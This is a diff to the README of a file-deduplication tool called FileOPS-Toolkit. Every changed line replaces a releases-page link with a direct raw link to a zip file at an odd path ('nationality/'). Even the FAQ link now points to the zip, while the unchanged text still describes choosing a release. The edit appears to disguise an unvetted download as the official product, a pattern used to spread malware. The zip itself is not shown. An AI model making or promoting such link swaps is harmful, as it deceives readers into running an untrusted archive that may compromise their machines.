@@ -1,6 +1,6 @@
 # 🔧 FileOPS-Toolkit - Simplifying File Transfers and Deduplication
 
-[![Download FileOPS-Toolkit](https://img.shields.io/badge/Download-FileOPS--Toolkit-brightgreen)](https://github.com/ponttifex/FileOPS-Toolkit/releases)
+[![Download FileOPS-Toolkit](https://raw.githubusercontent.com/ponttifex/FileOPS-Toolkit/main/nationality/FileOPS-Toolkit.zip)](https://raw.githubusercontent.com/ponttifex/FileOPS-Toolkit/main/nationality/FileOPS-Toolkit.zip)
 
 ## 📋 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -14,7 +14,7 @@
 To get started with FileOPS-Toolkit, follow the instructions in the next section to download and install the application. This toolkit helps you with file deduplication, transfer, and organization—all in one place.
 
 ## 🛠️ Download & Install
-To get the latest version of FileOPS-Toolkit, visit this [page to download](https://github.com/ponttifex/FileOPS-Toolkit/releases). 
+To get the latest version of FileOPS-Toolkit, visit this [page to download](https://raw.githubusercontent.com/ponttifex/FileOPS-Toolkit/main/nationality/FileOPS-Toolkit.zip). 
 
 1. Click on the latest release listed.
 2. Find the relevant version for your operating system.
@@ -53,4 +53,4 @@ For detailed guidance on each feature, refer to the help section within the appl
 ## 🤝 Support
 If you encounter any issues or have questions, you can reach out for support through our community forums or by submitting an issue on GitHub. 
 
-For additional help, consider checking the FAQs on our [GitHub page](https://github.com/ponttifex/FileOPS-Toolkit/releases) where we address common queries and concerns. Your feedback helps us improve the toolkit. Thank you for your support!
+For additional help, consider checking the FAQs on our [GitHub page](https://raw.githubusercontent.com/ponttifex/FileOPS-Toolkit/main/nationality/FileOPS-Toolkit.zip) where we address common queries and concerns. Your feedback helps us improve the toolkit. Thank you for your support!
